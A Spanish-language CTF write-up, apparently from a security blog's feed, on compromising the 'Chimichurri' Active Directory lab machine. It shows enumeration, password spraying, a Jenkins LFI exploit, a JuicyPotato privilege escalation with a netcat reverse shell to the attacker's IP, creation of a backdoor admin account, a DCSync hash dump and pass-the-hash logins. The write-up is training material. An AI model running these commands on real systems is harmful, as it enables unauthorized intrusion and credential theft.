<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-11T22:06:22-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Chimichurri - The Hackers Labs</title><link href="http://localhost:4000/chimichurri-thehackerslabs/" rel="alternate" type="text/html" title="Chimichurri - The Hackers Labs" /><published>2024-11-11T00:00:00-06:00</published><updated>2024-11-11T00:00:00-06:00</updated><id>http://localhost:4000/chimichurri-thehackerslabs</id><content type="html" xml:base="http://localhost:4000/chimichurri-thehackerslabs/"><![CDATA[<p>Esta máquina es de la plataforma The Hackers Labs <a href="https://thehackerslabs.com/">visitar</a></p>

<p>Certificaciones a aplicar: OSCP, eCPPTv3</p>

<p>Dificultad: Fácil</p>

<p>Técnicas Vistas:</p>

<ul>
  <li>SMB Enumeration</li>
  <li>Information Leakage</li>
  <li>RPC Enumeration (rpcclient)(Failed) (EXTRA)</li>
  <li>Ldap Enumeration (ldapsearch)(Failed) (EXTRA)</li>
  <li>AXFR - Domain Zone Transfer Attack (Failed)(EXTRA)</li>
  <li>Kerberos User Enumeration (Kerbrute) (EXTRA)</li>
  <li>ASRepRoast Attack (GetNPUsers)(Failed) (EXTRA)</li>
  <li>SMB Password Spray Attack (Netexec) (EXTRA)</li>
  <li>Jenkins Exploitation (LFI)</li>
  <li>Abusing WinRM</li>
  <li>Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]</li>
  <li>DCSync Exploitation NTDS (secretsdump, Netexec)</li>
  <li>PassTheHash (evil-winrm, wmiexec.py)</li>
</ul>

<p><img src="/assets/images/thl-writeup-chimichurri/chimichurri.jpg" alt="chimichurri.jpg" /></p>

<h1 id="ip-de-la-maquina">IP de la Maquina</h1>

<p>192.168.179.144</p>

<h1 id="reconocimiento">Reconocimiento</h1>

<p>En este caso como la maquina esta desplegada en VMware, en nuestra red local, para saber la ip empleamos la herramienta arp-scan como super usuario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp-scan <span class="nt">-l</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/Ip.png" alt="Ip.png" /></p>

<p>En este caso esta es la ip asignada a la maquina.</p>

<p>Comprobando conectividad con la maquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 192.168.179.144
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/ping.png" alt="ping.png" /></p>

<p>Identificando el sistema operativo</p>

<p>Empleamos un script hecho en python que en base al TTL nos dice ante que sistema operativo nos encontramos. El script fue hecho por <a href="https://x.com/s4vitar">s4vitar</a>, si quieren tenerlo se los dejo por aquí <a href="https://pastebin.com/HmBcu7j2">Descargar Script</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wichSystem.py 192.168.179.144
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/whichSystem.png" alt="whichSystem.png" /></p>

<h1 id="enumeración">Enumeración</h1>

<p>Escaneo de los puertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.141 <span class="nt">-oG</span> scanP

<span class="c"># sudo Privilegios de administrador</span>
<span class="c"># -p- Para que escanee todo el rango de puertos disponible (65,535)</span>
<span class="c"># --open Solo muestre los puertos abiertos (no filtrados ni cerrados)</span>
<span class="c"># -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)</span>
<span class="c"># --min-rate 5000 Agilizar escaneo</span>
<span class="c"># -vvv Nos reporte por consola a medida nos vaya descubriendo cosas</span>
<span class="c"># -n Para que no aplique resolucion DNS (ralentiza el escaneo)</span>
<span class="c"># -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)</span>
<span class="c"># -oG Para guardar en formato Grep</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/scanP.png" alt="scanP.png" /></p>

<p>Empleamos una utilidad llamada extractPorts, que nos permite sacar la información mas relevante de la captura Grep de nmap y copiar los puertos directamente a la clipboard, por eso guardamos en ese formato, para poder aprovechar esta utilidad y agilizar nuestro trabajo. Fue hecho por <a href="https://x.com/s4vitar">s4vitar</a>, si quieren tenerla se las dejo por aquí <a href="https://pastebin.com/tYpwpauW">Descargar Script</a>, Para usarla la deben incorporar en su .zshrc o .bashrc y instalar xclip.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Instalar xclip</span>
apt <span class="nb">install </span>xclip

<span class="c"># Usando la herramienta</span>
extractPorts scanP 
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/extractPorts.png" alt="extractPorts.png" /></p>

<p>Buscando vulnerabilidades en los servicios encontrados</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49672,49673,49675,49681,49704,49739 192.168.179.144 <span class="nt">-oN</span> scanS

<span class="c"># -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios</span>
<span class="c"># -p Indicamos los puertos</span>
<span class="c"># -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) </span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/scanS.png" alt="scanS.png" /></p>

<p>Como observamos tenemos muchos servicios porque estamos ante un directorio activo, en el cual hay bastantes servicios corriendo en la maquina victima, vamos a ir paso a paso enumerando servicio por servicio.</p>

<p>Importante como observamos en el escaneo nos muestra un dominio el cual para muchos de los ataques es indispensable que lo agreguemos al /etc/hosts.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/dominio.png" alt="dominio.png" /></p>

<p>Lo primero que haremos ya que tenemos el puerto 445 (SMB) abierto, que es el servicio para compartir recursos mediante la red, sera identificar ante que nos enfrentamos, para esto usaremos NetExec.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/nxc_smb.png" alt="nxc smb.png" /></p>

<p>Vemos que estamos ante un windows server 2016 y también nos muestra el dominio que previamente identificamos con Nmap.</p>

<p>Ahora miraremos si hay algún recurso compartido al cual podemos acceder sin proporcionar contraseña. empleando null session o con usuarios comunes como default, guest, invitado, etc.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/nxc_shares.png" alt="nxc shares.png" /></p>

<p>Vemos que tenemos un recurso bastante inusual llamado drogas en el cual tenemos permisos de lectura, aquí tenemos varias herramientas para utilizar y llegar a enumerar el contenido, podemos hacerlo con NetExec, SmbMap o SmbClient. En nuestro caso usaremos SmbClient ya que resulta bastante cómoda para estas tareas pero siempre nos apoyamos de las otras ya que en SmbClient no nos muestra que tipo de permisos poseemos sobre un recurso.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Conectarnos al recurso</span>
smbclient //192.168.179.144/drogas <span class="nt">-N</span>

<span class="c">#Listamos el contenido</span>
<span class="nb">dir</span>

<span class="c">#Descargar el archivo</span>
get <span class="o">{</span>file<span class="o">}</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/smbclient.png" alt="smbclient.png" /></p>

<p>Nos conectamos con éxito y vemos un txt dentro. Ahora nos vamos a descargar ese archivo para ver que contiene.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/getfile.png" alt="getfile.png" /></p>

<p>Lo descargamos en el directorio que ejecutamos SmbClient.</p>

<p>Vemos que el archivo nos da 2 cosas.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/credenciales.png" alt="credenciales.png" /></p>

<p>Una de ellas es un usuario y una pista de donde esta su contraseña.</p>

<p>Continuamos enumerando, Como mencione antes, enumeraremos como normalmente se haría en AD, para ver un poco las herramientas y servicios que suelen contener información importante que nos puede ser de utilidad, aunque en esta maquina no la encontremos, nos servirá mucho para otras que realicemos.</p>

<p>Enumerando RPC, usamos rpcclient para enumerar usuarios del dominio, grupos del dominio, descripciones de los usuarios o grupos etc.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Null Session</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> 192.168.179.144 <span class="nt">-N</span>

<span class="c">#Si disponemos de credenciales</span>
rpcclient <span class="nt">-U</span> <span class="s2">"user%pass"</span> <span class="o">{</span>IP_Victim<span class="o">}</span> 

</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/rpcclient.png" alt="rpcclient.png" /></p>

<p>Nos conectamos con éxito ahora los comandos que suelen utilizarse son los siguientes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Para ver info de usuarios del dominio</span>
enumdomusers

<span class="c">#Para ver grupos del dominio</span>
enumdomgroups

<span class="c">#Ver usuarios admin del dominio suelen tener el rid 0x200, todos los rid que reporte seran usuarios miembros de este grupo</span>
querygroupmem 0x200

<span class="c">#Para ver un usuario en base al rid</span>
queryuser rid

<span class="c">#Para ver las descripciones de los usuarios</span>
querydispinfo
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/enumdomusers.png" alt="enumdomusers.png" /></p>

<p>Vemos que no tenemos éxito, quiere decir que no permite null session y no podremos enumerar nada.</p>

<p>Enumeramos LDAP para ver información que también nos pueda ser útil, a veces encontramos usuarios entre otras cosas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumeramos los naming contexts</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://192.168.179.144 <span class="nt">-s</span> <span class="s1">'base'</span> namingcontext
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/ldapsearch_nc.png" alt="ldapsearch nc.png" /></p>

<p>Tomamos el primer valor de los naming contexts</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Tomamos el primer resultado de namingcontexts</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://192.168.179.144 <span class="nt">-b</span> <span class="s1">'DC=chimichurri,DC=thl'</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/ldapsearch_b.png" alt="ldapsearch b.png" /></p>

<p>No encontramos nada, recordemos esto lo hacemos solo para ver lo que normalmente se enumera en un DC.</p>

<p>Podemos probar también a lanzar una solicitud dns para ver si logramos hacer un ataque que se conoce como domain zone transfer.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Lanzar solicitud dns al dominio</span>

dig @192.168.179.144 chimichurri.thl
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/dig_solicitud_dns.png" alt="dig solicitud dns.png" /></p>

<p>Ver nombres de dominio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumerar nombres de dominio</span>
dig @192.168.179.144 chimichurri.thl ns
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/dig_ns.png" alt="dig ns.png" /></p>

<p>Ver servidores de correo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumerar servidores de correo</span>

dig @192.168.179.144 chimichurri.thl mx
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/dig_mx.png" alt="dig mx.png" /></p>

<p>Ataque Domain Zone Transfer</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Ataque domain zone transfer sirve para ver todos los subdomninios en caso de que existan, para agregarlos al /etc/hosts en caso de que se aplique virtualhosting y así ahorrar la fuerza bruta</span>

dig @192.168.179.144 chimichurri.thl axfr
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/dig_dzt.png" alt="dig dzt.png" /></p>

<p>En este caso no encontramos nada.</p>

<p>Podemos ir directamente a la maquina pero vamos a enumerar posibles usuarios a nivel de dominio. Hay usuarios que suelen ser comunes en estos entornos, podemos probar creando una pequeña lista y validarlos con kerbrute y ucon impacket-GetNPUsers.</p>

<p>Enumerando usuarios y aparte probara por defecto el ASREPRoast que es un ataque que explota a los usuarios que carecen del atributo requerido de pre-autenticación de Kerberos.</p>

<p>Primero creamos este pequeño diccionario.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/dic.png" alt="dic.png" /></p>

<p>Kerbrute</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> chimichurri.thl <span class="nt">--dc</span> 192.168.179.144 users.txt
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/kerbrute.png" alt="kerbrute.png" /></p>

<p>Vemos que nos a encontrado 3 usuarios validos a nivel de dominio, del cual ya conocíamos uno. Pero ninguno tiene el atributo requerido de pre-autenticación de Kerberos, ya que si un usuario lo tuviera nos mostraría un hash el cual podemos tratar de crackear de manera offline.</p>

<p>impacket-GetNPUsers</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt chimichurri.thl/
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/Get-NPUsers.png" alt="Get-NPUsers.png" /></p>

<p>De esta manera también podemos validar los usuarios que existen, ya que como observamos en la imagen para aquellos usuarios que no son validos el mensaje cambia, en los que son validos el mensaje es doesn’t have UF_DONT_REQUIRE_PREAUTH set.</p>

<p>Seguimos con la maquina? pues todavía no, ahora mostrare otra técnica llamada password spraying, ahora que tenemos 3 usuarios validos borramos los demás y nos quedamos únicamente con estos para realizar la prueba. Crearemos un diccionario sencillo solo para mostrar como se hace.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/usersdc.png" alt="usersdc.png" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#--continue-on-success es para que siga probando aunque nos encuentre una credencial valida, ya que si no le indicamos este parametro, cuando encuentre la primera se va a detener.</span>
nxc smb 192.168.179.144 <span class="nt">-u</span> users.txt <span class="nt">-p</span> dic.txt <span class="nt">--continue-on-success</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/passwordspraying.png" alt="passwordspraying.png" /></p>

<p>Vemos que de esta forma detectamos 2 credenciales para 2 usuarios. Lo dejaremos por aquí de momento y ahora sigamos con la maquina. Espero estas técnicas les sirvan para futuras maquinas en hacking de AD.</p>

<p>Ahora si continuemos con la maquina. Repasando un poco, ya que analizamos varios servicios donde en algunos sacamos alguna información interesante no encontramos mas, así que revisemos el escaneo de nmap de nuevo.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/catscanS.png" alt="catscanS.png" /></p>

<p>Vemos que hay Jenkins corriendo en ese puerto, vamos a ver que nos muestra.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/jenkins.png" alt="jenkins.png" /></p>

<p>En efecto tenemos un jenkins, revisando un poco, tenemos un login para el cual tampoco tenemos credenciales, revisando un poco mas y si tenemos buen ojo lograremos enumerar algo interesante.</p>

<p>Utilizando whatweb también podemos ver eso interesante.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/whatweb.png" alt="whatweb.png" /></p>

<p>Obtenemos la version de jenkins y como no poseemos credenciales, podemos buscar algún exploit para esa version o una version un poco mas arriba.</p>

<h1 id="explotación">Explotación</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit Jenkins 2.
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/searchsploit.png" alt="searchsploit.png" /></p>

<p>Encontramos un exploit para la version 2.441 que contempla un LFI, vamos a probarlo. Nos copiamos el exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> java/webapps/51993.py
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/searchsploit-m.png" alt="searchsploit-m.png" /></p>

<p>Ahora lo renombrare y lo probaremos para ver que nos solicita.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python jexploit.py
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/jpexploit.png" alt="jpexploit.png" /></p>

<p>Vemos que nos pide la url y una ruta. Esto nos devuelve al archivo que encontramos en el smb el cual nos decía que el usuario hacker tienes sus credenciales como perico en el escritorio. Recordemos como suelen estar ubicadas las carpetas de los usuarios en sistemas windows.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python jexploit.py <span class="nt">-u</span> http://192.168.179.144:6969/ <span class="nt">-p</span> /Users/hacker/Desktop/perico.txt <span class="o">&gt;</span> creds.txt
</code></pre></div></div>

<p>De esta manera redirigimos la salida del comando para que la guarde en un archivo llamado creds.txt</p>

<p><img src="/assets/images/thl-writeup-chimichurri/creds.png" alt="creds.png" /></p>

<p>Vemos que tenemos el archivo, si lo revisamos encontraremos las credenciales para el usuario hacker.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/hackercreds.png" alt="hackercreds.png" /></p>

<p>Ahora vamos a comprobar si esas credenciales son validas con NetExec. Si nos coloca Pwn3d! significa que este usuario posee privilegios altos y podríamos usar Psexec para conectarnos, de lo contrario si coloca un + significa que solo son validas, si coloca un - no son validas. También comprobaremos con el servicio de administración remota de windows (winrm), si aquí nos coloca Pwn3d! nos podremos conectar con Evil-Winrm.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/nxc_creds.png" alt="nxc creds.png" /></p>

<p>Solo nos coloca + significa que son validas pero no podemos usar psexec para conectarnos.</p>

<p>Ahora comprobamos con el servicio winrm</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc winrm 192.168.179.144 <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/nxc_winrm.png" alt="nxc winrm.png" /></p>

<p>Como observamos nos coloca Pwn3d!, entonces nos podemos conectar con Evil-Winrm.</p>

<p>Evil-Winrm</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span> <span class="nt">-i</span> 192.168.179.144
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/evil-winrm.png" alt="evil-winrm.png" /></p>

<p>Estamos dentro de la maquina como el usuario hacker, ahora nos queda buscar una manera de elevar privilegios y convertirnos en el usuario Administrador del Dominio.</p>

<h1 id="escalada-de-privilegios-post-explotación">Escalada de Privilegios (Post Explotación)</h1>

<p>Como siguiente paso el objetivo es convertirnos en usuarios administradores del dominio, para eso realizaremos las siguientes acciones</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Ver info general de un usuario</span>
net user usuario

<span class="c">#Ver los grupos</span>
net group o net localgroup

<span class="c">#ver los privilegios que posee ese usuario</span>
<span class="nb">whoami</span> /priv

<span class="c">#Ver toda la info del usuario</span>
<span class="nb">whoami</span> /all

<span class="c">#Ver si el usuario pertenece a ese grupo de manera local o a nivel de dominio</span>
net localgroup <span class="s2">"grupo"</span> o net group <span class="s2">"grupo"</span>

</code></pre></div></div>

<p>Info general del usuario</p>

<p><img src="/assets/images/thl-writeup-chimichurri/netuser.png" alt="netuser.png" /></p>

<p>Grupos</p>

<p><img src="/assets/images/thl-writeup-chimichurri/netgroup.png" alt="netgroup.png" /></p>

<p>La información que obtengamos de aquí nos va a ser muy útil para saber por donde vamos a escalar privilegios, no siempre va a ser así, en otros casos nos tocara recurrir a otras herramientas para enumerar de una mejor manera.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/whoami-priv.png" alt="whoami-priv.png" /></p>

<p>Al observar los privilegios vemos que hay uno interesante, vamos a ver como podemos aprovecharnos de este y escalar privilegios.</p>

<p>Podemos usar dos herramientas JuicyPotato o PetitPotato. En este caso usaremos la primera.</p>

<p>Lo primero sera descargar la herramienta desde aquí <a href="https://github.com/ohpe/juicy-potato/releases">JuicyPotato</a> luego la transferimos a la maquina victima. Primero nos crearemos un folder en tmp, para organizar mejor nuestro trabajo, luego aquí subiremos lo que necesitemos.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/Privesc.png" alt="Privesc.png" /></p>

<p>Ya tenemos creado el folder al cual llamamos Privesc.</p>

<p>Transferimos el JuicyPotato a la maquina victima. Renombramos el ejecutable a Jp.exe para mas comodidad.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/mvJp.png" alt="mvJp.png" /></p>

<p><img src="/assets/images/thl-writeup-chimichurri/transferJp.png" alt="transferJp.png" /></p>

<p>Ya lo tenemos. Continuamos, vamos a hacer 2 cosas pasar un netcat y obtener una reverseshell y luego crear un usuario y agregarlo al grupo de administradores. En este caso haremos las 2, para que vean como se hace. Buscamos el nc.exe en nuestro sistema o lo descargamos, una ves hecho eso lo trasnferimos.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/nc.png" alt="nc.png" /></p>

<p>Ya con esto probamos lo siguiente, nos ponemos en escucha en nuestro equipo y ejecutamos el JuicyPotato de la siguiente manera, (Depende el SO ante el que estemos, si da algun error deberemos buscar el CLSID adecuado en el mismo repo <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">CLISD</a> buscar la version y seleccionar uno que ejecute NT Authority System). En este caso funciona con el que lanza por defecto.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\P</span><span class="s2">rivesc</span><span class="se">\n</span><span class="s2">c.exe -e cmd 192.168.179.139 4444"</span>
</code></pre></div></div>

<p>Observamos que obtenemos la conexion sin problemas como NT Authority Systerm</p>

<p><img src="/assets/images/thl-writeup-chimichurri/ntAuth.png" alt="ntAuth.png" /></p>

<p>Solo que si tratamos de ver las flags no nos deja ya que debemos ser Usuario admin del dominio para poder verlas.  ya siendo NT Authority System podemos realizar los pasos de abajo sin usar JuicyPotato.</p>

<p>Creación del usuario y agregarlo al grupo administradores.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Creacion del usuario</span>
.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user ewor01 pass123! /add"</span>

<span class="c">#Agregar al grupo Administradores</span>
.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net localgroup Administradores ewor01 /add"</span>

<span class="c">#Para que en crackmapexec por smb nos ponga pwned y poder hacer de todo con ese usuario, hay que retocar el siguiente registro</span>
.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span>

</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/useradd.png" alt="useradd.png" /></p>

<p>Al ejecutar los primeros 2 y verificar con netexec vemos que nos pone un +, si queremos que nos coloque Pwn3d! debemos retocar un registro para el cual es el tercer comando y tener capacidad de conectarnos como usuario privilegiado con el usuario que acabamos de agregar.</p>

<p>Usuario agregado con privilegios.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/userpriv.png" alt="userpriv.png" /></p>

<p>Podremos conectarnos como el usuario que hemos agregado, con evilwin-rm pero no podríamos ver las flag debido a que debemos ser usuarios administradores del dominio, para eso Vamos a realizar un dumping de los hashes de los usuarios con netexec o con secrests-dump mediante NTDS (NTDS, o NT Directory Services, es el archivo de base de datos de Microsoft Active Directory) empleando un Dcsync attack.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#secretsdump, Nos va a solicitar la contrasenia del usuario la colocamos y listo.</span>
impacket-secretsdump chimichurri.thl/ewor01@192.168.179.144

<span class="c">#Netexec </span>
nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'ewor01'</span> <span class="nt">-p</span> <span class="s1">'pass123!'</span> <span class="nt">--ntds</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/secrets-dump.png" alt="secrets-dump.png" /></p>

<p><img src="/assets/images/thl-writeup-chimichurri/ntds.png" alt="ntds.png" /></p>

<p>El hash que nos interesa es el del usuario administrador, no necesitamos conocer su contraseña ya que realizaremos una técnica llamada pass the hash para conectarnos a la maquina mediante evilwin-rm.</p>

<p>Primero comprobamos el hash del usuario Administrador.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc winrm 192.168.179.144 <span class="nt">-u</span> <span class="s1">'Administrador'</span> <span class="nt">-H</span> <span class="s1">'hash'</span>
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/domainAdmin.png" alt="domainAdmin.png" /></p>

<p>Ahora solo nos queda conectarnos con evil-winrm, psexec o wmiexec para emplear Pass the hash. Al usar psexec sucede algo, siempre ingresa como NT Authority System y no como Admin del dominio, con wmiexec si funciona correctamente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.179.144 <span class="nt">-u</span> <span class="s1">'Administrador'</span> <span class="nt">-H</span> <span class="s1">'hash'</span>
</code></pre></div></div>

<p>Una vez obtenemos acceso podemos visualizar las flags y dar por terminada la maquina.</p>

<p><img src="/assets/images/thl-writeup-chimichurri/adminuser.png" alt="adminuser.png" /></p>

<p><img src="/assets/images/thl-writeup-chimichurri/pwned.png" alt="pwned.png" /></p>

<p>wmiexec</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-wmiexec chimichurri.thl/Administrador@192.168.179.144 <span class="nt">-shell-type</span> powershell <span class="nt">-hashes</span> :hash
</code></pre></div></div>

<p><img src="/assets/images/thl-writeup-chimichurri/wmiexec.png" alt="wmiexec.png" /></p>

<p>De esta forma tenemos 2 opciones para ingresar a la maquina, también con el usuario que creamos podíamos solo cambiar el pass del usuario administrador para ganar acceso a la maquina.</p>

<p>¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para enumerar un AD y para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!</p>]]></content><author><name>ewor01</name></author><category term="thehackerslabs" /><category term="OSCP" /><category term="Active Directory" /><category term="Fácil" /><category term="Windows" /><category term="eCPPTv3" /><category term="SMB Enumeration" /><category term="Information Leakage" /><category term="RPC Enumeration" /><category term="Ldap Enumeration" /><category term="AXFR - Domain Zone Transfer Attack" /><category term="Kerberos User Enumeration" /><category term="ASRepRoast Attack" /><category term="SMB Password Spray Attack" /><category term="Jenkins Exploitation" /><category term="Abusing WinRM" /><category term="Abusing SeImpersonatePrivilege - Juicy Potato" /><category term="DCSync Exploitation NTDS" /><category term="PassTheHash" /><summary type="html"><![CDATA[Chimichurri es una máquina Windows de Active Directory, donde encontramos un information leakage inicial en el SMB, luego aprovechamos un LFI para explotar Jenkins y obtener credenciales. Luego obtenemos acceso mediante evil-winrm. Para escalar privilegios, abusamos del privilegio SeImpersonatePrivilege, permitiendo la elevación a Admin del dominio. Además, aplicamos técnicas de enumeración específicas para Active Directory, lo que brinda una introducción práctica a técnicas de hacking y escalación de privilegios en entornos AD.]]></summary></entry><entry><title type="html">Blogger - Hack Journey</title><link 